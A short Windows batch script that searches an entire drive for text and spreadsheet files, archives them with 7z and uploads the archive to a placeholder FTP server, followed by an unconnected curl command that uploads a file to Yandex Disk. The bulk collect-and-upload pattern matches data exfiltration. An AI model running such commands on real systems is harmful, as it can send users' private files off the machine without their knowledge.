@echo off

:: set the directory to search for files
set SEARCH_DIR=\
set SEARCH_EXT=*.txt *.xls *.xlsx

:: set the archive name and destination
set ARCHIVE_NAME=archive.zip
set ARCHIVE_DESTINATION=C:\archive

:: set FTP server credentials
set FTP_SERVER=ftp.example.com
set FTP_USERNAME=ftp_username
set FTP_PASSWORD=ftp_password

:: search for files with the given extensions
echo Searching for files...
for /r %SEARCH_DIR% %%f in (%SEARCH_EXT%) do (
    echo Found file: "%%f"
    7z a "%ARCHIVE_DESTINATION%\%ARCHIVE_NAME%" "%%f"
)

:: upload the archive to the FTP server
echo Uploading the archive...
echo open %FTP_SERVER%> ftp.txt
echo %FTP_USERNAME%>> ftp.txt
echo %FTP_PASSWORD%>> ftp.txt
echo put %ARCHIVE_DESTINATION%\%ARCHIVE_NAME%>> ftp.txt
echo quit>> ftp.txt
ftp -s:ftp.txt



curl -T /path/to/local/file.jpg "https://cloud-api.yandex.net/v1/disk/resources/upload?path=/remote/folder/file.jpg&overwrite=true" -H "Authorization: OAuth <access_token>"

